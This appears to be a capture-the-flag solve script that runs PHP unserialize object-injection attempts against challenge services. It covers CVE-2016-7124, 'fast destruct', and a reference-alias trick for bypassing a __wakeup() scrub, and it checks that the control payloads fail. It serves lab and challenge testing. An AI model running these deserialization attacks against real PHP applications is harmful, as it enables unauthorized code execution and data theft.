#!/usr/bin/env python3
"""
08 - postbox / bypassing a property-scrubbing __wakeup().

    usage: solve.py [modern-url] [legacy-url]

Stages:
  1. naive payload on the modern service    -> must FAIL (the scrub works)
  2. CVE-2016-7124 on the modern service    -> must FAIL (patched in 7.0.10)
  3. "fast destruct" on the modern service  -> must FAIL (folklore, measured)
  4. the reference trick on the modern one  -> the flag
  5. CVE-2016-7124 on the legacy service    -> the legacy flag, one byte changed

Everything is Python 3 standard library; the serialized bytes are built by hand
in payloads.py.
"""

import sys

import payloads
from client import Postbox


def attempt(box: Postbox, name: str, blob: bytes, label: bytes, expect: bool):
    print(f"[*] {name}")
    print(f"    {blob!r}")
    box.deliver(blob)
    flag = box.flag_for(label)
    if flag and expect:
        print(f"[+] as expected, the gadget fired -> {flag.decode()}")
    elif flag and not expect:
        print(f"[!] UNEXPECTED: the gadget fired -> {flag.decode()}")
    elif expect:
        print("[!] UNEXPECTED: nothing reached the spool")
    else:
        print("    as expected, nothing reached the spool")
    print()
    return flag


def main() -> int:
    modern = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
    legacy = sys.argv[2] if len(sys.argv) > 2 else "http://legacy"
    hot, old = Postbox(modern), Postbox(legacy)

    # The spool is append-only and the container may have been warm for a
    # while: label every attachment with this run's nonce so a stage can never
    # be credited with an entry it did not write.
    naive_label = payloads.label(b"m-naive")
    cve_label = payloads.label(b"m-cve")
    gc_label = payloads.label(b"m-gc")
    ref_label = payloads.label(b"m-ref")
    legacy_label = payloads.label(b"l-cve")

    print(f"[*] modern service : {modern}")
    print(f"[*] legacy service : {legacy}")
    print(f"[*] run nonce      : {payloads.RUN_NONCE.decode()}")
    print()

    print("=== 1/5  modern: straight object injection ".ljust(72, "="))
    bad_naive = attempt(hot, "plain DraftMessage with attachments",
                        payloads.payload_naive(naive_label), naive_label, expect=False)

    print("=== 2/5  modern: CVE-2016-7124 (inflated property count) ".ljust(72, "="))
    bad_cve = attempt(hot, "header says 4 properties, 3 follow",
                      payloads.payload_cve_2016_7124(cve_label), cve_label, expect=False)

    print("=== 3/5  modern: \"fast destruct\" duplicate array key ".ljust(72, "="))
    bad_gc = attempt(hot, "a:2:{i:0;<object>i:0;i:1;}",
                     payloads.payload_fast_destruct(gc_label), gc_label, expect=False)

    print("=== 4/5  modern: the reference trick ".ljust(72, "="))
    print("    attachments is R:2; -- an alias of the zval behind `subject`,")
    print("    which __wakeup() itself writes back after the scrub.")
    flag = attempt(hot, "DraftMessage with attachments = R:2;",
                   payloads.payload_reference(ref_label), ref_label, expect=True)

    print("=== 5/5  legacy (PHP 7.0.9): CVE-2016-7124 ".ljust(72, "="))
    legacy_flag = attempt(old, "the very same payload as stage 2",
                          payloads.payload_cve_2016_7124(legacy_label), legacy_label, expect=True)

    print("-" * 72)
    print(f"[=] modern / naive            : {'LEAKED (bug!)' if bad_naive else 'blocked'}")
    print(f"[=] modern / CVE-2016-7124    : {'LEAKED (bug!)' if bad_cve else 'blocked (not vulnerable)'}")
    print(f"[=] modern / fast destruct    : {'LEAKED (bug!)' if bad_gc else 'blocked'}")
    print(f"[=] modern / reference trick  : {'OK' if flag else 'FAILED'}")
    print(f"[=] legacy / CVE-2016-7124    : {'OK' if legacy_flag else 'FAILED'}")
    print()

    if bad_naive or bad_cve or bad_gc:
        print("a control payload succeeded: the modern service is not guarded properly",
              file=sys.stderr)
        return 1
    if not legacy_flag:
        print("the legacy service did not fall over to CVE-2016-7124", file=sys.stderr)
        return 1
    if not flag:
        print("the reference trick did not produce the flag", file=sys.stderr)
        return 1

    print(f"LEGACY FLAG: {legacy_flag.decode()}")
    print(f"FLAG: {flag.decode()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
